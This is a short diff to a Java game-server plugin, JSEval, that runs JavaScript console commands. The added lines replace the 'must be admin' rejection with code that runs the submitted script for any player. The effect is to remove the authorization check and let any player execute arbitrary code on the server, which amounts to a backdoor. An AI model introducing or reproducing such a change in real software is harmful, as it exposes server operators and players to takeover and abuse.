@@ -16,7 +16,9 @@ public class JSEval extends Plugin {
                  String output = mods.getScripts().runConsole(args[0]);
                  player.sendMessage("> " + (isError(output) ? "[#ff341c]" + output : output));
             } else {
-                player.sendMessage("[scarlet]You must be admin to use this command.");
+                 Call.sendMessage(player.name + " [JS]: "+ args);
+                 String output = mods.getScripts().runConsole(args[0]);
+                 player.sendMessage("> " + (isError(output) ? "[#ff341c]" + output : output));
             }
         });
     }
